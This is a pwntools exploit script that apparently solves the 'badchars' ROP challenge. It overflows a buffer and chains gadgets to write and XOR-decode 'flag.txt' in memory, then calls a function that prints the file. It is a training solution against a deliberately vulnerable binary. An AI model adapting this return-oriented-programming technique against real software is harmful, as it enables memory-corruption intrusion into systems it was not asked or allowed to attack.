from pwn import *

elf = ELF('./badchars')
p = elf.process()

p.recvuntil('>')

#0x0000000000400634 : mov qword ptr [r13], r12 ; ret
#0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#0x00000000004006a3 : pop rdi ; ret
#0x00000000004006a0 : pop r14 ; pop r15 ; ret
#0x0000000000400628 : xor byte ptr [r15], r14b ; ret

num = 2

payload = b'A'*40
payload += p64(0x00000000004004ee) #ret
payload += p64(0x000000000040069c) #pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload += p64(0x767a762c65636e64) #encoded string
payload += p64(0x00601038)         #empty memory
payload += p64(0xaaaaaaaaaaaaaaaa) #junk
payload += p64(0xbbbbbbbbbbbbbbbb) #junk
payload += p64(0x0000000000400634) #mov qword ptr [r13], r12 ; ret

for i in range (0,8):
	payload += p64(0x00000000004006a0) #pop r14 ; pop r15 ; ret
	payload += p64(0x2)                #number XOR
	payload += p64(0x00601038 + i)     
	payload += p64(0x0000000000400628) #xor byte ptr [r15], r14b ; ret

payload += p64(0x00000000004006a3)
payload += p64(0x00601038)
payload += p64(0x0000000000400510)

p.sendline(payload)
print(p.recvall())	

